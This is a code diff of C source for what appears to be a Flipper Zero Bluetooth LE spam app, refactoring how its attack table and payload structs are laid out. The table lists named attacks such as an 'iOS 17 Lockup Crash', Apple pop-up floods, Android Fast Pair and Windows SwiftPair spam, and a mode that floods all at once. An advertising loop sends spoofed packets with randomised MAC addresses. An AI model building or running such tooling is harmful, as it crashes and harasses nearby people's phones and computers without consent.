@@ -12,36 +12,31 @@
 // Controversy explained at https://willyjl.dev/blog/the-controversy-behind-apple-ble-spam
 
 typedef struct {
-    bool random_mac;
-    const BleSpamProtocol* protocol;
-    BleSpamMsg msg;
-} Payload;
-
-typedef struct {
     const char* title;
     const char* text;
-    Payload payload;
+    const BleSpamProtocol* protocol;
+    BleSpamPayload payload;
 } Attack;
 
 static Attack attacks[] = {
     {
         .title = "+ Kitchen Sink",
         .text = "Flood all attacks at once",
+        .protocol = NULL,
         .payload =
             {
                 .random_mac = true,
-                .protocol = NULL,
-                .msg = {},
+                .cfg = {},
             },
     },
     {
         .title = "iOS 17 Lockup Crash",
         .text = "Newer iPhones, long range",
+        .protocol = &ble_spam_protocol_continuity,
         .payload =
             {
                 .random_mac = false,
-                .protocol = &ble_spam_protocol_continuity,
-                .msg =
+                .cfg =
                     {
                         .continuity =
                             {
@@ -54,11 +49,11 @@ static Attack attacks[] = {
     {
         .title = "Apple Action Modal",
         .text = "Lock cooldown, long range",
+        .protocol = &ble_spam_protocol_continuity,
         .payload =
             {
                 .random_mac = false,
-                .protocol = &ble_spam_protocol_continuity,
-                .msg =
+                .cfg =
                     {
                         .continuity =
                             {
@@ -71,11 +66,11 @@ static Attack attacks[] = {
     {
         .title = "Apple Device Popup",
         .text = "No cooldown, close range",
+        .protocol = &ble_spam_protocol_continuity,
         .payload =
             {
                 .random_mac = false,
-                .protocol = &ble_spam_protocol_continuity,
-                .msg =
+                .cfg =
                     {
                         .continuity =
                             {
@@ -88,11 +83,11 @@ static Attack attacks[] = {
     {
         .title = "Android Device Pair",
         .text = "Reboot cooldown, long range",
+        .protocol = &ble_spam_protocol_fastpair,
         .payload =
             {
                 .random_mac = true,
-                .protocol = &ble_spam_protocol_fastpair,
-                .msg =
+                .cfg =
                     {
                         .fastpair = {},
                     },
@@ -101,11 +96,11 @@ static Attack attacks[] = {
     {
         .title = "Windows Device Found",
         .text = "Requires enabling SwiftPair",
+        .protocol = &ble_spam_protocol_swiftpair,
         .payload =
             {
                 .random_mac = true,
-                .protocol = &ble_spam_protocol_swiftpair,
-                .msg =
+                .cfg =
                     {
                         .swiftpair = {},
                     },
@@ -131,12 +126,13 @@ static int32_t adv_thread(void* ctx) {
     uint16_t delay;
     uint8_t* packet;
     uint8_t mac[GAP_MAC_ADDR_SIZE];
-    Payload* payload = &attacks[state->index].payload;
+    BleSpamPayload* payload = &attacks[state->index].payload;
+    const BleSpamProtocol* protocol = attacks[state->index].protocol;
     if(!payload->random_mac) furi_hal_random_fill_buf(mac, sizeof(mac));
 
     while(state->advertising) {
-        if(payload->protocol) {
-            payload->protocol->make_packet(&size, &packet, &payload->msg);
+        if(protocol) {
+            protocol->make_packet(&size, &packet, &payload->cfg);
         } else {
             ble_spam_protocols[rand() % ble_spam_protocols_count]->make_packet(
                 &size, &packet, NULL);
@@ -200,8 +196,8 @@ static void draw_callback(Canvas* canvas, void* ctx) {
 
     const Attack* attack =
         (state->index >= 0 && state->index <= ATTACK_COUNT - 1) ? &attacks[state->index] : NULL;
-    const Payload* payload = &attack->payload;
-    const BleSpamProtocol* protocol = (attack && payload->protocol) ? payload->protocol : NULL;
+    const BleSpamPayload* payload = &attack->payload;
+    const BleSpamProtocol* protocol = attack->protocol;
 
     canvas_set_font(canvas, FontSecondary);
     canvas_draw_icon(canvas, 4, 3, protocol ? protocol->icon : &I_ble);
@@ -290,7 +286,7 @@ static void draw_callback(Canvas* canvas, void* ctx) {
             "%02i/%02i: %s",
             state->index + 1,
             ATTACK_COUNT,
-            protocol ? protocol->get_name(&payload->msg) : "Everything");
+            protocol ? protocol->get_name(&payload->cfg) : "Everything");
         canvas_draw_str(canvas, 4 - (state->index < 19 ? 1 : 0), 21, str);
 
         canvas_set_font(canvas, FontPrimary);
